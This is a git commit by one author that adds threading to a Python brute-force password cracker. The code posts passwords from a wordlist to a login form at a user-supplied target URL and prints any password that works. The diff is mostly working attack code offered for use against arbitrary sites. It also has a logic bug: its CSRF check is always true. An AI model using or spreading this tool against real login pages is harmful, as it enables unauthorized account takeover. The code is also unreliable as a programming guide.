1e9cc0c3539c560114ebbb6961fdaa6c502bc1f8
Tanvir Hossain Antu <textmeantu@gmail.com>
2023-03-02 09:55:20 +0600

    multi-threaded added
    I use a multi-threaded approach to speed up the password-cracking process. The crack_passwords function is run in a separate thread for each chunk of passwords read from the file. Each thread calls the crack method to try the passwords in the chunk.
    
    Note that this code is still a brute-force approach, which can be very slow if the password list is huge.

--- bruteforce.py
+++ bruteforce.py
@@ -19,19 +19,8 @@ print ("""
 
 """)
 
-banner = """     
 
-
-
-                       Checking the Server !!
-        
-        [+]█████████████████████████████████████████████████[+]
-
-
-
-"""
-
-
+import threading
 import requests
 import time
 import sys
@@ -47,37 +36,47 @@ class BruteForceCracker:
             sys.stdout.flush()
             time.sleep(0.02)
 
-    def crack(self, passwords):
-        count = 0
-        for password in passwords:
-            password = password.strip()
-            count = count + 1
-            print("Trying Password: "+ str(count) + ' Time For => ' + password)
-            data_dict = {"LogInID": self.username,"Password": password, "Log In":"submit"}
-            response = requests.post(self.url, data=data_dict)
-            if self.error_message in str(response.content):
-                pass
-            elif "CSRF" or "csrf" in str(response.content):
-                print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
-                return
-            else:
-                print("Username: ---> " + self.username)
-                print("Password: ---> " + password)
-                return
-        print("[!!] password not in list")
+    def crack(self, password):
+        data_dict = {"LogInID": self.username, "Password": password, "Log In": "submit"}
+        response = requests.post(self.url, data=data_dict)
+        if self.error_message in str(response.content):
+            return False
+        elif "CSRF" or "csrf" in str(response.content):
+            print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
+            sys.exit()
+        else:
+            print("Username: ---> " + self.username)
+            print("Password: ---> " + password)
+            return True
 
+def crack_passwords(passwords, cracker):
+    count = 0
+    for password in passwords:
+        count += 1
+        password = password.strip()
+        print("Trying Password: {} Time For => {}".format(count, password))
+        if cracker.crack(password):
+            return
 
 def main():
     url = input("Enter Target Url: ")
     username = input("Enter Target Username: ")
     error = input("Enter Wrong Password Error Message: ")
     cracker = BruteForceCracker(url, username, error)
-
-    try:
-        with open("passwords.txt", "r") as passwords:
-            cracker.crack(passwords)
-    except:
-        print("Some Error Occurred Please Check Your Internet Connection !!")
+    
+    with open("passwords.txt", "r") as f:
+        chunk_size = 1000
+        while True:
+            passwords = f.readlines(chunk_size)
+            if not passwords:
+                break
+            t = threading.Thread(target=crack_passwords, args=(passwords, cracker))
+            t.start()
 
 if __name__ == '__main__':
+    banner = """ 
+                       Checking the Server !!        
+        [+]█████████████████████████████████████████████████[+]
+"""
+    print(banner)
     main()
